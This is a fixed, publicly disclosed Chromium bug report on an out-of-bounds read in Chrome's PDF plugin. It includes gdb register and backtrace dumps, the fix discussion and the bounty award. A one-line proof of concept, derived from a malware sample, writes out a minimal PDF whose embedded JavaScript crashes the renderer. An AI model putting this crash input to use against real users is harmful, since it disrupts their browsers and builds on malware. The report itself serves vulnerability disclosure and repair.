# Renderer crash with PDF at isalnum

| Field | Value |
|-------|-------|
| **Issue ID** | [40095836](https://issues.chromium.org/issues/40095836) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink, Internals, Internals>Plugins>PDF |
| **Reporter** | ao...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2011-10-02 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Opening the attached PDF document causes a renderer crash due to invalid read at isalnum with an addresses like 0xffffffff800acf66.

**VERSION**  

Chrome Version: 14.0.835.186 stable (also beta and dev)  

Operating System: Linux, Debian 6.0.2 (32- and 64-bit)

**REPRODUCTION CASE**  

Note: the repro is derived from a malware sample.

$ google-chrome isalnum.pdf

The repro still has a compressed section of JS, which in the original file contains a large array followed by some deobfuscation code. Based on the crash location I'd guess it happens after decompression while parsing or running the JS, but I haven't yet been able to decompress the stream and have a look at what is happening. The original JS stream does not cause this.

I'll try to minimize the repro further later today.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:  

Program received signal SIGSEGV, Segmentation fault.  

0x00007fffee977773 in isalnum () from /lib/libc.so.6  

(gdb) x/3i $rip  

=> 0x7fffee977773 <isalnum+19>: movzwl (%rax,%rdi,2),%eax  

0x7fffee977777 <isalnum+23>: and $0x8,%eax  

0x7fffee97777a <isalnum+26>: retq  

(gdb) i r  

rax 0x7ffff466c82c 140737293764652  

rbx 0x7fffffffb6e0 140737488336608  

rcx 0x9e 158  

rdx 0xffffffffffffff80 -128  

rsi 0x7fffffffb720 140737488336672  

rdi 0xffffffffbe021b9d -1107158115  

rbp 0x7fffffffb720 0x7fffffffb720  

rsp 0x7fffffffb338 0x7fffffffb338  

r8 0x8 8  

r9 0x101010101010101 72340172838076673  

r10 0x3900000055 244813135957  

r11 0x7fffee9ca42a 140737196631082  

r12 0xbe021b9d 3187809181  

r13 0x7fffea0b7cbc 140737120009404  

r14 0x7fffe6f00b60 140737067879264  

r15 0x73 115  

rip 0x7fffee977773 0x7fffee977773 <isalnum+19>  

eflags 0x10202 [ IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0  

(gdb) bt 10  

#0 0x00007fffee977773 in isalnum () from /lib/libc.so.6  

#1 0x00007fffe9efab95 in ?? () from /opt/google/chrome/libpdf.so  

#2 0x00007fffe9efb5e9 in ?? () from /opt/google/chrome/libpdf.so  

#3 0x00007fffe9ee01c6 in ?? () from /opt/google/chrome/libpdf.so  

#4 0x00007fffe9edef83 in ?? () from /opt/google/chrome/libpdf.so  

#5 0x00007fffe9edf0a8 in ?? () from /opt/google/chrome/libpdf.so  

#6 0x00007fffe9edf188 in ?? () from /opt/google/chrome/libpdf.so  

#7 0x00007fffe9edf293 in ?? () from /opt/google/chrome/libpdf.so  

#8 0x00007fffe9edf483 in ?? () from /opt/google/chrome/libpdf.so  

#9 0x00007fffe9edf5c3 in ?? () from /opt/google/chrome/libpdf.so  

(More stack frames follow...)

## Attachments

- [isalnum.pdf](attachments/isalnum.pdf) (application/pdf; charset=binary, 5.5 KB)
- [repro.pdf](attachments/repro.pdf) (text/plain; charset=us-ascii, 141 B)

## Timeline

### [Deleted User] (2011-10-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-04)

I'll deal with this when I get back (next week). Aki, awesome if you can a minimized repro by then.

### ao...@gmail.com (2011-10-10)

I some progress. The crash occurs when eval() is given bad data under a few layers of obfuscation. There is a code point 7039 in the argument string, which is somehow different from a visually indistinguishable string constructed with String.fromCharCode. I'll post a better repro a bit later.

### ao...@gmail.com (2011-10-10)

Got it: 
 $ echo "%PDF 1 0 obj<</Pages 1 0 R /OpenAction 2 0 R>> 2 0 obj<</S /JavaScript /JS (eval(String.fromCharCode(97,99999999)))>> trailer<</Root 1 0 R>>" > repro.pdf;
 $ google-chrome repro.pdf

Crash moves with the high code point.

### sc...@gmail.com (2011-10-10)

Nice Aki, thanks! I was planning to tackle this today, too, so good timing.

### sc...@gmail.com (2011-10-10)

OOB read due to failure to honor the contract of isalnum:
---
The c argument is an int, the value of which the application shall ensure is representable as an unsigned char or equal to the value of the macro EOF. If the argument has any other value, the behavior is undefined.
---

glibc takes the liberty of crashing for its particular view of "undefined", which it is of course permitted to do.

### sc...@gmail.com (2011-10-11)

Safest to let this one roll into M16, I think.

### sc...@gmail.com (2011-10-11)

r1140 on PDF trunk.

### sc...@gmail.com (2011-12-10)

@aohelin: interesting bug. It's hard to rule out a bitwise recovery of the OOB content, hence a $500 Chromium Security Reward :D

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ao...@gmail.com (2011-12-11)

@scarybeasts excellent :)

### sc...@gmail.com (2011-12-20)

Payment in system.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/98809?no_tracker_redirect=1

[Multiple monorail components: Blink, Internals, Internals>Plugins>PDF]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095836)*
